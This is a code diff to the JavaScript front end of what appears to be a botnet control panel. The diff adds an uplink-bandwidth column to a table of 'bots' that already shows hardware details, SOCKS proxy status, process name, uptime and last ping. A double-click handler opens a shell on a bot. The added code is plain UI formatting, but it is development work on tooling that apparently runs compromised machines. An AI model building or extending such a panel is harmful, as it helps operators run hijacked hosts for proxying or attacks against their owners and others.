@@ -22,6 +22,12 @@ function formatRAM(mb) {
   return mb >= 1024 ? (mb / 1024).toFixed(1) + 'GB' : mb + 'MB';
 }
 
+function formatUplink(mbps) {
+  if (!mbps || mbps <= 0) return '<span style="opacity:0.4">-</span>';
+  if (mbps >= 1000) return '<span style="color:#58a6ff">' + (mbps / 1000).toFixed(1) + ' Gbps</span>';
+  return '<span style="color:#58a6ff">' + mbps.toFixed(1) + ' Mbps</span>';
+}
+
 function ago(iso) {
   var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
   if (s < 5) return 'just now';
@@ -323,6 +329,7 @@ function createBotRow(b) {
     '<td>' + escHtml(b.arch) + '</td>' +
     '<td>' + formatRAM(b.ram) + '</td>' +
     '<td>' + b.cpuCores + '</td>' +
+    '<td>' + formatUplink(b.uplinkMbps) + '</td>' +
     '<td>' + escHtml(b.processName) + '</td>' +
     '<td>' + socksHtml + '</td>' +
     '<td>' + escHtml(b.uptime) + '</td>' +
@@ -332,19 +339,20 @@ function createBotRow(b) {
 
 function updateBotRow(row, b) {
   var cells = row.getElementsByTagName('td');
-  if (cells.length < 12) return;
+  if (cells.length < 13) return;
   var socksHtml = b.socksActive
     ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
     : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
   cells[4].innerHTML = groupTagHtml(b.group);
   cells[6].textContent = formatRAM(b.ram);
   cells[7].textContent = b.cpuCores;
-  cells[8].textContent = b.processName;
-  cells[9].innerHTML = socksHtml;
-  cells[10].textContent = b.uptime;
+  cells[8].innerHTML = formatUplink(b.uplinkMbps);
+  cells[9].textContent = b.processName;
+  cells[10].innerHTML = socksHtml;
+  cells[11].textContent = b.uptime;
   var h = botHealth(b.lastPing);
-  cells[11].className = h.cls;
-  cells[11].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
+  cells[12].className = h.cls;
+  cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
   row.className = 'bot-row ' + h.row;
   row.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
   row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
@@ -692,6 +700,7 @@ function fillPopup(b) {
   document.getElementById('popup-arch').textContent = b.arch;
   document.getElementById('popup-ram').textContent = formatRAM(b.ram);
   document.getElementById('popup-cpu').textContent = b.cpuCores + ' cores';
+  document.getElementById('popup-uplink').innerHTML = formatUplink(b.uplinkMbps);
   document.getElementById('popup-proc').textContent = b.processName;
   document.getElementById('popup-uptime').textContent = b.uptime;
   document.getElementById('popup-ping').textContent = ago(b.lastPing);
